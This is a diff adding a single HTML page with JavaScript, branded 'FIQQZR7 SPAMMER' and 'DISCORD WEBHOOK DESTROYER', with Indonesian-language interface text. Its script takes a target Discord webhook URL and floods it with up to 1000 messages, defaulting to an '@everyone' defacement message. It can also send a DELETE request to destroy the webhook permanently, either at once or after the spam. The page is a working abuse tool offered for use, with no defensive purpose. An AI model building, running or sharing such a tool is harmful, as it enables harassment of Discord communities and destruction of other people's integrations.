@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>FIQQZR7 • WEBHOOK SPAMMER</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', monospace;
+        }
+        
+        body {
+            background: #0a0a0a;
+            min-height: 100vh;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: repeating-linear-gradient(0deg, 
+                rgba(0, 255, 0, 0.03) 0px, 
+                rgba(0, 0, 0, 0.8) 1px,
+                rgba(0, 255, 0, 0.03) 2px);
+            pointer-events: none;
+            z-index: -1;
+        }
+
+        @keyframes scan {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(100vh); }
+        }
+
+        .scanline {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 5px;
+            background: linear-gradient(to bottom, transparent, #0f0, transparent);
+            animation: scan 8s linear infinite;
+            opacity: 0.3;
+            pointer-events: none;
+            z-index: 999;
+        }
+
+        @keyframes glitch {
+            0%, 100% { text-shadow: 2px 0 0 #ff00ff, -2px 0 0 #00ffff; }
+            25% { text-shadow: -2px 0 0 #ff00ff, 2px 0 0 #00ffff; }
+            50% { text-shadow: 3px 0 0 #ff00ff, -3px 0 0 #00ffff; }
+            75% { text-shadow: -3px 0 0 #ff00ff, 3px 0 0 #00ffff; }
+        }
+
+        .container {
+            max-width: 700px;
+            margin: 0 auto;
+            background: rgba(10, 10, 10, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid #0f0;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.1);
+            padding: 25px;
+            border-radius: 12px;
+            position: relative;
+            z-index: 10;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            border-bottom: 1px dashed #0f0;
+            padding-bottom: 20px;
+        }
+
+        .title {
+            font-size: 2.2rem;
+            color: #0f0;
+            animation: glitch 3s infinite;
+            letter-spacing: 5px;
+            margin-bottom: 10px;
+            word-break: break-word;
+        }
+
+        .subtitle {
+            color: #8f8;
+            font-size: 0.8rem;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+
+        .status-badge {
+            display: inline-block;
+            background: #0f0;
+            color: #000;
+            padding: 5px 15px;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 0.8rem;
+            letter-spacing: 2px;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-group label {
+            display: block;
+            color: #0f0;
+            margin-bottom: 8px;
+            font-size: 0.9rem;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+
+        .input-group input, .input-group textarea, .input-group select {
+            width: 100%;
+            padding: 14px 18px;
+            background: #111;
+            border: 1px solid #333;
+            color: #0f0;
+            font-size: 1rem;
+            border-radius: 8px;
+            transition: all 0.3s;
+            font-family: 'Courier New', monospace;
+        }
+
+        .input-group input:focus, .input-group textarea:focus, .input-group select:focus {
+            outline: none;
+            border-color: #0f0;
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.3);
+            background: #0a0a0a;
+        }
+
+        .input-group textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+
+        .checkbox-group {
+            background: #0a0a0a;
+            border: 1px solid #222;
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-item {
+            display: flex;
+            align-items: center;
+            margin-bottom: 12px;
+            color: #8f8;
+        }
+
+        .checkbox-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .checkbox-item input[type="radio"] {
+            width: 18px;
+            height: 18px;
+            margin-right: 12px;
+            accent-color: #0f0;
+            cursor: pointer;
+        }
+
+        .btn-group {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            margin: 25px 0 15px;
+        }
+
+        .btn {
+            flex: 1;
+            min-width: 150px;
+            padding: 16px 20px;
+            border: none;
+            background: #111;
+            color: #0f0;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            border: 1px solid #333;
+            border-radius: 8px;
+            transition: all 0.3s;
+            font-size: 0.9rem;
+        }
+
+        .btn:hover {
+            background: #0f0;
+            color: #000;
+            border-color: #0f0;
+            box-shadow: 0 0 20px #0f0;
+        }
+
+        .btn.danger:hover {
+            background: #ff0033;
+            border-color: #ff0033;
+            color: #fff;
+            box-shadow: 0 0 20px #ff0033;
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .log-container {
+            background: #050505;
+            border: 1px solid #222;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 25px;
+            max-height: 250px;
+            overflow-y: auto;
+        }
+
+        .log-title {
+            color: #0f0;
+            margin-bottom: 15px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #333;
+            padding-bottom: 10px;
+        }
+
+        .log-content {
+            color: #8f8;
+            font-size: 0.85rem;
+            line-height: 1.6;
+        }
+
+        .log-entry {
+            padding: 6px 0;
+            border-bottom: 1px dotted #1a1a1a;
+            color: #8f8;
+            word-break: break-word;
+        }
+
+        .log-entry.error {
+            color: #ff6b6b;
+        }
+
+        .log-entry.success {
+            color: #0f0;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 6px;
+            background: #222;
+            border-radius: 3px;
+            margin: 15px 0;
+            display: none;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: #0f0;
+            width: 0%;
+            border-radius: 3px;
+            transition: width 0.3s;
+            box-shadow: 0 0 10px #0f0;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-between;
+            color: #0f0;
+            font-size: 0.9rem;
+            margin-bottom: 10px;
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #555;
+            font-size: 0.7rem;
+            letter-spacing: 2px;
+        }
+
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .title { font-size: 1.6rem; }
+            .btn { min-width: 100%; }
+        }
+
+        ::-webkit-scrollbar {
+            width: 6px;
+        }
+        ::-webkit-scrollbar-track {
+            background: #111;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #0f0;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <div class="scanline"></div>
+    
+    <div class="container">
+        <div class="header">
+            <h1 class="title">FIQQZR7 SPAMMER</h1>
+            <div class="subtitle">DISCORD WEBHOOK DESTROYER // V3.0</div>
+            <span class="status-badge" id="statusBadge">⚡ FIQQZR7 ARMED ⚡</span>
+        </div>
+
+        <div class="input-group">
+            <label>🔗 DISCORD WEBHOOK URL</label>
+            <input type="url" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..." autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <label>👤 AVATAR URL (Optional)</label>
+            <input type="url" id="avatarUrl" placeholder="https://i.imgur.com/example.png">
+        </div>
+
+        <div class="input-group">
+            <label>📝 USERNAME (Optional)</label>
+            <input type="text" id="username" placeholder="FIQQZR7" value="FIQQZR7">
+        </div>
+
+        <div class="input-group">
+            <label>💬 MESSAGE CONTENT</label>
+            <textarea id="messageContent" placeholder="Masukkan pesan nak spam...">@everyone FIQQZR7 STAFF WAS HERE</textarea>
+        </div>
+
+        <div class="input-group">
+            <label>🔢 SPAM COUNT</label>
+            <input type="number" id="spamCount" min="1" max="1000" value="10">
+        </div>
+
+        <div class="checkbox-group">
+            <div class="checkbox-item">
+                <input type="radio" name="deleteOption" id="dontDelete" value="none" checked>
+                <label for="dontDelete">⛔ Jangan hapus webhook</label>
+            </div>
+            <div class="checkbox-item">
+                <input type="radio" name="deleteOption" id="deleteNow" value="now">
+                <label for="deleteNow">💀 Hapus webhook langsung</label>
+            </div>
+            <div class="checkbox-item">
+                <input type="radio" name="deleteOption" id="deleteAfter" value="after">
+                <label for="deleteAfter">🗑️ Hapus setelah spam selesai</label>
+            </div>
+        </div>
+
+        <div class="progress-bar" id="progressBar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
+
+        <div class="stats">
+            <span>📊 STATUS: <span id="statsStatus">IDLE</span></span>
+            <span>✅ SUCCESS: <span id="statsSuccess">0</span></span>
+            <span>❌ FAILED: <span id="statsFailed">0</span></span>
+        </div>
+
+        <div class="btn-group">
+            <button class="btn" id="startSpamBtn" onclick="startSpam()">🚀 START SPAM</button>
+            <button class="btn" id="stopSpamBtn" onclick="stopSpam()" disabled>🛑 STOP</button>
+            <button class="btn danger" id="deleteWebhookBtn" onclick="deleteWebhook()">💢 DELETE WEBHOOK</button>
+            <button class="btn" onclick="clearLog()">🧹 CLEAR LOG</button>
+        </div>
+
+        <div class="log-container">
+            <div class="log-title">
+                <span>⎯ FIQQZR7 EXECUTION LOG ⎯</span>
+                <span style="color: #0f0; font-size: 0.8rem;">[ OMEGA NULL ]</span>
+            </div>
+            <div class="log-content" id="logContent">
+                <div class="log-entry">[FIQQZR7] Webhook spammer initialized</div>
+                <div class="log-entry">[READY] Masukkan webhook URL target</div>
+            </div>
+        </div>
+
+        <div class="footer">
+            FIQQZR7 STAFF // OMEGA-NULL ARMAGEDDON DEP-02 // FOR AUTHORIZED USE ONLY
+        </div>
+    </div>
+
+    <script>
+        let isSpamming = false;
+        let successCount = 0;
+        let failedCount = 0;
+
+        function addLog(message, type = '') {
+            const logContent = document.getElementById('logContent');
+            const now = new Date();
+            const timestamp = `[${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}]`;
+            
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            entry.textContent = `${timestamp} ${message}`;
+            logContent.appendChild(entry);
+            logContent.scrollTop = logContent.scrollHeight;
+        }
+
+        function clearLog() {
+            const logContent = document.getElementById('logContent');
+            logContent.innerHTML = '<div class="log-entry">[FIQQZR7] Log cleared.</div>';
+        }
+
+        function updateStats() {
+            document.getElementById('statsSuccess').textContent = successCount;
+            document.getElementById('statsFailed').textContent = failedCount;
+        }
+
+        function resetStats() {
+            successCount = 0;
+            failedCount = 0;
+            updateStats();
+        }
+
+        async function sendWebhookMessage() {
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            const messageContent = document.getElementById('messageContent').value.trim();
+            const avatarUrl = document.getElementById('avatarUrl').value.trim() || undefined;
+            const username = document.getElementById('username').value.trim() || 'FIQQZR7';
+
+            if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                addLog('ERROR: Webhook URL tidak valid!', 'error');
+                return false;
+            }
+
+            const payload = {
+                content: messageContent,
+                username: username,
+                avatar_url: avatarUrl
+            };
+
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    successCount++;
+                    addLog(`SUCCESS: Pesan terkirim (${successCount})`, 'success');
+                    updateStats();
+                    return true;
+                } else {
+                    failedCount++;
+                    addLog(`ERROR: Gagal kirim - HTTP ${response.status}`, 'error');
+                    updateStats();
+                    return false;
+                }
+            } catch (error) {
+                failedCount++;
+                addLog(`ERROR: Network error - ${error.message}`, 'error');
+                updateStats();
+                return false;
+            }
+        }
+
+        async function deleteWebhook() {
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            
+            if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                addLog('ERROR: Webhook URL tidak valid!', 'error');
+                return;
+            }
+
+            if (!confirm('⚠️ Webhook akan dihapus permanen! Lanjutkan?')) {
+                addLog('DELETE: Dibatalkan');
+                return;
+            }
+
+            addLog('DELETE: Menghapus webhook...');
+            
+            try {
+                const response = await fetch(webhookUrl, { method: 'DELETE' });
+                if (response.ok) {
+                    addLog('DELETE: Webhook berhasil dihapus!', 'success');
+                    document.getElementById('webhookUrl').value = '';
+                } else {
+                    addLog(`DELETE: Gagal - HTTP ${response.status}`, 'error');
+                }
+            } catch (error) {
+                addLog(`DELETE: Network error - ${error.message}`, 'error');
+            }
+        }
+
+        async function startSpam() {
+            if (isSpamming) return;
+
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            const spamCount = parseInt(document.getElementById('spamCount').value) || 10;
+            const deleteOption = document.querySelector('input[name="deleteOption"]:checked').value;
+
+            if (!webhookUrl || !webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
+                addLog('ERROR: Masukkan webhook URL yang valid!', 'error');
+                return;
+            }
+
+            if (deleteOption === 'now') {
+                await deleteWebhook();
+                return;
+            }
+
+            resetStats();
+            isSpamming = true;
+            document.getElementById('statsStatus').textContent = 'SPAMMING...';
+            document.getElementById('startSpamBtn').disabled = true;
+            document.getElementById('stopSpamBtn').disabled = false;
+            document.getElementById('deleteWebhookBtn').disabled = true;
+            document.getElementById('progressBar').style.display = 'block';
+            
+            addLog(`🚀 FIQQZR7 MEMULAI SPAM: ${spamCount} pesan`);
+
+            for (let i = 0; i < spamCount && isSpamming; i++) {
+                await sendWebhookMessage();
+                const progress = ((i + 1) / spamCount) * 100;
+                document.getElementById('progressFill').style.width = progress + '%';
+                await new Promise(resolve => setTimeout(resolve, 500));
+            }
+
+            if (isSpamming) {
+                addLog('✅ SPAM SELESAI! FIQQZR7 MENANG!', 'success');
+                document.getElementById('statsStatus').textContent = 'COMPLETE';
+                
+                if (deleteOption === 'after') {
+                    await deleteWebhook();
+                }
+            }
+
+            isSpamming = false;
+            document.getElementById('startSpamBtn').disabled = false;
+            document.getElementById('stopSpamBtn').disabled = true;
+            document.getElementById('deleteWebhookBtn').disabled = false;
+            document.getElementById('progressFill').style.width = '0%';
+            document.getElementById('progressBar').style.display = 'none';
+        }
+
+        function stopSpam() {
+            if (isSpamming) {
+                isSpamming = false;
+                addLog('🛑 SPAM DIHENTIKAN OLEH FIQQZR7');
+                document.getElementById('statsStatus').textContent = 'STOPPED';
+                document.getElementById('startSpamBtn').disabled = false;
+                document.getElementById('stopSpamBtn').disabled = true;
+                document.getElementById('deleteWebhookBtn').disabled = false;
+                document.getElementById('progressFill').style.width = '0%';
+                document.getElementById('progressBar').style.display = 'none';
+            }
+        }
+    </script>
+</body>
+</html>
